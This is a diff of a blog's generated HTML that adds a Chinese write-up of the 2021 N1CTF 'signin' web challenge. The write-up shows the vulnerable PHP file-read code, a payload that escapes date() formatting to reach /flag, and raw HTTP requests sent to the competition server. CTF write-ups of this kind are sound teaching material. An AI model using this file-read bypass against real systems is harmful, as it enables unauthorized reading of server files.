@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>c1ay&#39;s blog</title>
+    <title>2021 n1ctf 复盘 · c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >c1ay&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2021 n1ctf 复盘</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>c1ay's blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            2021 n1ctf 复盘
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/11/23</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,39 +399,72 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2017/11/03/github+hexo搭建博客总结/" >
-            
-                <span>我的第一篇博客</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="github-hexo搭建博客总结"><a href="#github-hexo搭建博客总结" class="headerlink" title="github+hexo搭建博客总结"></a>github+hexo搭建博客总结</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>这是我的第一篇博客，为了搭这个博客折腾了好久，第一篇文章就记录一下搭建过程吧.</strong><br>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/11/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Hexo">Hexo</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="2021-n1ctf-复盘"><a href="#2021-n1ctf-复盘" class="headerlink" title="2021 n1ctf 复盘"></a>2021 n1ctf 复盘</h1><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>web题只做出了签到，哭了</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//flag is /flag</span></div><div class="line">$path=$_POST[<span class="string">'path'</span>];</div><div class="line">$time=(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>])) ? urldecode(date(file_get_contents(<span class="string">'php://input'</span>))) : date(<span class="string">"Y/m/d H:i:s"</span>);</div><div class="line">$name=<span class="string">"/var/www/tmp/"</span>.time().rand().<span class="string">'.txt'</span>;</div><div class="line">$black=<span class="string">"f|ht|ba|z|ro|;|,|=|c|g|da|_"</span>;</div><div class="line">$blist=explode(<span class="string">"|"</span>,$black);</div><div class="line"><span class="keyword">foreach</span>($blist <span class="keyword">as</span> $b)&#123;</div><div class="line">    <span class="keyword">if</span>(strpos($path,$b) !== <span class="keyword">false</span>)&#123;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(file_put_contents($name, $time))&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;logpath:$name&lt;/code&gt;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line">$check=preg_replace(<span class="string">'/((\s)*(\n)+(\s)*)/i'</span>,<span class="string">''</span>,file_get_contents($path));</div><div class="line"><span class="keyword">if</span>(is_file($check))&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;"</span>.file_get_contents($check).<span class="string">"&lt;/code&gt;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>代码很简单，就是接收<code>php://input</code>的内容，经过urldecode(date(file_get_contents(‘php://input’)))处理后写入文件，然后获取写入后文件的内容，如果获取到的内容是一个存在的文件，则读取输出</p>
+<p>但是date函数会对一些字符进行格式化，翻阅php官方文档可以看到字符有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">format 字符	说明	返回值例子</div><div class="line">日	---	---</div><div class="line">d	月份中的第几天，有前导零的 <span class="number">2</span> 位数字	<span class="number">01</span> 到 <span class="number">31</span></div><div class="line">D	星期中的第几天，文本表示，<span class="number">3</span> 个字母	Mon 到 Sun</div><div class="line">j	月份中的第几天，没有前导零	<span class="number">1</span> 到 <span class="number">31</span></div><div class="line">l（“L”的小写字母）	星期几，完整的文本格式	Sunday 到 Saturday</div><div class="line">N	ISO<span class="number">-8601</span> 格式数字表示的星期中的第几天（PHP <span class="number">5.1</span><span class="number">.0</span> 新加）	<span class="number">1</span>（表示星期一）到 <span class="number">7</span>（表示星期天）</div><div class="line">S	每月天数后面的英文后缀，<span class="number">2</span> 个字符	st，nd，rd 或者 th。可以和 j 一起用</div><div class="line">w	星期中的第几天，数字表示	<span class="number">0</span>（表示星期天）到 <span class="number">6</span>（表示星期六）</div><div class="line">z	年份中的第几天	<span class="number">0</span> 到 <span class="number">365</span></div><div class="line">星期	---	---</div><div class="line">W	ISO<span class="number">-8601</span> 格式年份中的第几周，每周从星期一开始（PHP <span class="number">4.1</span><span class="number">.0</span> 新加的）	例如：<span class="number">42</span>（当年的第 <span class="number">42</span> 周）</div><div class="line">月	---	---</div><div class="line">F	月份，完整的文本格式，例如 January 或者 March	January 到 December</div><div class="line">m	数字表示的月份，有前导零	<span class="number">01</span> 到 <span class="number">12</span></div><div class="line">M	三个字母缩写表示的月份	Jan 到 Dec</div><div class="line">n	数字表示的月份，没有前导零	<span class="number">1</span> 到 <span class="number">12</span></div><div class="line">t	指定的月份有几天	<span class="number">28</span> 到 <span class="number">31</span></div><div class="line">年	---	---</div><div class="line">L	是否为闰年	如果是闰年为 <span class="number">1</span>，否则为 <span class="number">0</span></div><div class="line">o	ISO<span class="number">-8601</span> 格式年份数字。这和 Y 的值相同，只除了如果 ISO 的星期数（W）属于前一年或下一年，则用那一年。（PHP <span class="number">5.1</span><span class="number">.0</span> 新加）	Examples: <span class="number">1999</span> <span class="keyword">or</span> <span class="number">2003</span></div><div class="line">Y	<span class="number">4</span> 位数字完整表示的年份	例如：<span class="number">1999</span> 或 <span class="number">2003</span></div><div class="line">y	<span class="number">2</span> 位数字表示的年份	例如：<span class="number">99</span> 或 <span class="number">03</span></div><div class="line">时间	---	---</div><div class="line">a	小写的上午和下午值	am 或 pm</div><div class="line">A	大写的上午和下午值	AM 或 PM</div><div class="line">B	Swatch Internet 标准时	<span class="number">000</span> 到 <span class="number">999</span></div><div class="line">g	小时，<span class="number">12</span> 小时格式，没有前导零	<span class="number">1</span> 到 <span class="number">12</span></div><div class="line">G	小时，<span class="number">24</span> 小时格式，没有前导零	<span class="number">0</span> 到 <span class="number">23</span></div><div class="line">h	小时，<span class="number">12</span> 小时格式，有前导零	<span class="number">01</span> 到 <span class="number">12</span></div><div class="line">H	小时，<span class="number">24</span> 小时格式，有前导零	<span class="number">00</span> 到 <span class="number">23</span></div><div class="line">i	有前导零的分钟数	<span class="number">00</span> 到 <span class="number">59</span>&gt;</div><div class="line">s	秒数，有前导零	<span class="number">00</span> 到 <span class="number">59</span>&gt;</div><div class="line">u	毫秒 （PHP <span class="number">5.2</span><span class="number">.2</span> 新加）。需要注意的是 date() 函数总是返回 <span class="number">000000</span> 因为它只接受 integer 参数， 而 DateTime::format() 才支持毫秒。	示例: <span class="number">654321</span></div><div class="line">时区	---	---</div><div class="line">e	时区标识（PHP <span class="number">5.1</span><span class="number">.0</span> 新加）	例如：UTC，GMT，Atlantic/Azores</div><div class="line">I	是否为夏令时	如果是夏令时为 <span class="number">1</span>，否则为 <span class="number">0</span></div><div class="line">O	与格林威治时间相差的小时数	例如：+<span class="number">0200</span></div><div class="line">P	与格林威治时间（GMT）的差别，小时和分钟之间有冒号分隔（PHP <span class="number">5.1</span><span class="number">.3</span> 新加）	例如：+<span class="number">02</span>:<span class="number">00</span></div><div class="line">T	本机所在的时区	例如：EST，MDT（【译者注】在 Windows 下为完整文本格式，例如“Eastern Standard Time”，中文版会显示“中国标准时间”）。</div><div class="line">Z	时差偏移量的秒数。UTC 西边的时区偏移量总是负的，UTC 东边的时区偏移量总是正的。	<span class="number">-43200</span> 到 <span class="number">43200</span></div><div class="line">完整的日期／时间	---	---</div><div class="line">c	ISO <span class="number">8601</span> 格式的日期（PHP <span class="number">5</span> 新加）	<span class="number">2004</span><span class="number">-02</span><span class="number">-12</span>T15:<span class="number">19</span>:<span class="number">21</span>+<span class="number">00</span>:<span class="number">00</span></div><div class="line">r	RFC <span class="number">822</span> 格式的日期	例如：Thu, <span class="number">21</span> Dec <span class="number">2000</span> <span class="number">16</span>:<span class="number">01</span>:<span class="number">07</span> +<span class="number">0200</span></div><div class="line">U	从 Unix 纪元（January <span class="number">1</span> <span class="number">1970</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> GMT）开始至今的秒数	参见 time()</div></pre></td></tr></table></figure>
+<p>所以如果直接传入/flag的话，lag会被格式化为其他内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">php &gt; <span class="keyword">echo</span> date(<span class="string">"/flag"</span>);</div><div class="line">/fTuesdayam10</div></pre></td></tr></table></figure>
+<p>这里还有urldecode，所以将/flag进行url编码后再传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">php &gt; echo date(&quot;/%66%6c%61%67&quot;);</div><div class="line">/%66%62021-11-23T10:23:29+08:00%61%67</div></pre></td></tr></table></figure>
+<p>看到c也会被格式化</p>
+<p>又在官方文档当中看到，可以使用转义符<code>\</code>进行转义：</p>
+<p><img src="http://pic.c1imber.top/blog/20211123/zhIiktnmnP5a.png?imageslim" alt="mark"></p>
+<p>所以可以使用：</p>
+<p><code>/%66%6\c%61%67</code></p>
+<p>或者直接：</p>
+<p><code>/f\l\a\g</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">php &gt; <span class="keyword">echo</span> date(<span class="string">"/f\l\a\g"</span>);</div><div class="line">/flag</div><div class="line">php &gt; <span class="keyword">echo</span> urldecode(date(<span class="string">"/%66%6\c%61%67"</span>));</div><div class="line">/flag</div></pre></td></tr></table></figure>
+<p>获取flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /?time=<span class="number">111</span> HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">43.155</span><span class="number">.64</span><span class="number">.70</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">Cache-Control: max-age=0</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 14</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">/%66%6\c%61%67</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://pic.c1imber.top/blog/20211123/BQQHbPxkSVtf.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">43.155</span><span class="number">.64</span><span class="number">.70</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">Cache-Control: max-age=0</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 41</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">path=/var/www/tmp/1637634632190067238.txt</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211123/G6kmMRv9GjRG.png?imageslim" alt="mark"></p>
+<p><code>n1ctf{bypass_date_1s_s000_eassssy}</code></p>
+<p>其他题目复现后也会补充一下</p>
+
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2021/11/23/2021 n1ctf 复盘/">https://c1aysec.github.io/2021/11/23/2021 n1ctf 复盘/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2021/11/23/2021 n1ctf 复盘/">November 23rd 2021, 10:08:49 am</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2021/11/23/2021 n1ctf 复盘/">November 23rd 2021, 10:47:25 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/11/19/2021 L3HCTF 部分web wp/" title= "2021 L3HCTF 部分web wp">
+                    <div class="prevTitle">2021 L3HCTF 部分web wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -451,6 +545,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-n1ctf-复盘"><span class="toc-number">1.</span> <span class="toc-text">2021 n1ctf 复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-number">1.0.1.</span> <span class="toc-text">signin</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2208,6 +2320,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
